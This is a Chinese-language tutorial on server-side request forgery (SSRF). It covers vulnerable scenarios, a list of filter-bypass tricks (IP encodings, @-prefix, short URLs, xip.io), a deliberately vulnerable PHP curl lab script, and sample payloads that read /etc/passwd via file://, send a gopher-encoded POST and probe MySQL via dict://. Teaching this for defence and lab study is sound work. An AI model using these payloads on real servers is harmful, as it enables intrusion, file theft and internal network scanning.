# SSRF服务器端请求伪造
`SSRF`服务端请求伪造漏洞，也称为`XSPA`跨站端口攻击，是一种由攻击者构造一定的利用代码导致服务端发起漏洞利用请求的安全漏洞，一般情况下`SSRF`攻击的应用是无法通过外网访问的，所以需要借助目标服务端进行发起，目标服务器可以链接内网和外网，攻击者便可以通过目标主机攻击内网应用。

## 描述
`SSRF`是利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制，通常攻击者通过伪造服务器请求与内网进行交互，从而达到探测内网，对内网进行攻击的目的，通常与多种攻击方式相结合。服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似，例如处在域中的浏览器可作为攻击者的代理。  
在一些情况下由于业务需要，服务端程序需要从其他服务器应用中获取数据，例如获取图片、数据等，但是由于服务器没有对其请求的目标地址做过滤和限制，导致黑客可以利用此缺陷请求任意服务器资源，其中就包含隐匿在内网的应用。很多情况下认为服务器在内网不会受到黑客攻击，便放任漏洞不管，不做补丁修复和版本升级，弱口令遍布内网，在`SSRF`漏洞面前这些漏洞都会造成很大危害。`SSRF`漏洞一般为`HTTP／HTTPS`方式出现，但类似`TCP Connect`方式也可以探测内网的IP活跃状态和端口的开放情况，但此类危害较小。

### SSRF漏洞易出现的场景
能够对外发起网络请求的地方，就可能存在`SSRF`漏洞。
* 从远程服务器请求资源`Upload from URL，Import & Export RSS Feed`。
* 数据库内置功能`Oracle、MongoDB、MSSQL、Postgres、CouchDB`。
* `Webmail`收取其他邮箱邮件`POP3、IMAP、SMTP`。
* 文件处理、编码处理、属性信息处理`ffmpeg、ImageMagic、DOCX、PDF、XML`。
* 通过`URL`地址分享页面。
* 未公开的`api`实现以及其他调用`URL`的功能。

### SSRF漏洞的利用
* 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的`banner`信息。
* 攻击运行在内网或本地的应用程序，比如溢出。
* 对内网`web`应用进行指纹识别，通过访问默认文件实现。
* 攻击内外网的`web`应用，主要是使用`GET`参数就可以实现的攻击，比如`Struts2`、`sqli`等。
* 利用`file`协议读取本地文件等。

### 绕过方式
#### 攻击本机

```
http://127.0.0.1:80
http://localhost:22
```

#### 利用@绕过

```
http://example.com@127.0.0.1
# 这里的example.com可以任意替换，
```

#### 利用短地址绕过

```
http://127.0.0.1可以变为http://suo.im/5UHEvD
# 转换地址有很多，可以采用http://tool.chinaz.com/tools/dwz.aspx
```

#### 特殊域名绕过

```
http://127.0.0.1.xip.io/
http://www.margin.com.127.0.0.1.xip.io/
```

#### 利用Enclosed alphanumerics

```
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

#### 利用句号代替点绕过

```
127.0.0.1 变为127。0。0。1
```

#### 使用其他进制绕过

```
127.0.0.1
8进制格式：0177.0.0.1
16进制格式：0x7F.0.0.1
10进制整数格式：2130706433（转16进制，再转10进制）
16进制整数格式：0x7F000001
还有一种特殊的省略模式，例如127.0.0.1这个IP可以写成127.1、10.0.0.1这个IP可以写成10.1
```

#### 特殊域名绕过

```
DNS解析
http://127.0.0.1.xip.io/
# 会解析到本地的127.0.0.1
```

## 实验靶机示例
使用`PHP`构建靶机作为示例，编写如下代码`test.php`，实际上避免这类攻击的重要原则就是过滤用户输入即永远不要相信用户的输入。

```php
<?php
// 创建一个新curl资源
$ch = curl_init();
// 设置URL和相应的选项
curl_setopt($ch, CURLOPT_URL, $_GET['url']);
curl_setopt($ch, CURLOPT_HEADER, false);
// 抓取URL并把它传递给浏览器
curl_exec($ch);
//关闭cURL资源，并且释放系统资源
curl_close($ch);
```

### file协议的运用
在上述示例中发起一个`GET`请求便可以获取敏感文件的信息。

```
http://192.168.163.150/test.php?url=file:///etc/passwd
```


### gopher协议的运用
`gopher`协议是比`http`协议更早出现的协议，现在已经不常用了，但是在`SSRF`漏洞利用中`gopher`可以说是万金油，因为可以使用`gopher`发送各种格式的请求包，这样变可以解决漏洞点不在`GET`参数的问题了。   
基本协议格式：`URL:gopher://<host>:<port>/<gopher-path>`。  
进行如下请求可以发送一个`POST`请求，且参数`cmd`的值为`balabal`，这里构造`gopher`请求的时候，回车换行符号要进行`2`次`url`编码`%250d%250a`。

```
http://192.168.163.150/test.php?url=gopher://192.168.163.1:80/_POST%20/evil.php%20HTTP/1.1%250d%250aHost:%20192.168.163.1%250d%250aUser-Agent:%20curl/7.43.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd=balabala
```

### dict协议应用
`dict`协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，但是在`SSRF`中如果可以使用`dict`协议那么就可以轻易的获取目标服务器端口上运行的服务版本等信息。 

```
http://192.168.163.150/test.php?url=dict://192.168.163.1:3306/info 
```




## 参考

```
https://zhuanlan.zhihu.com/p/116039804
https://www.freebuf.com/column/157466.html
https://juejin.cn/post/6844903824948199431
https://www.cnblogs.com/bmjoker/p/9614789.html
https://blog.csdn.net/nz9611/article/details/96011013
https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0
```

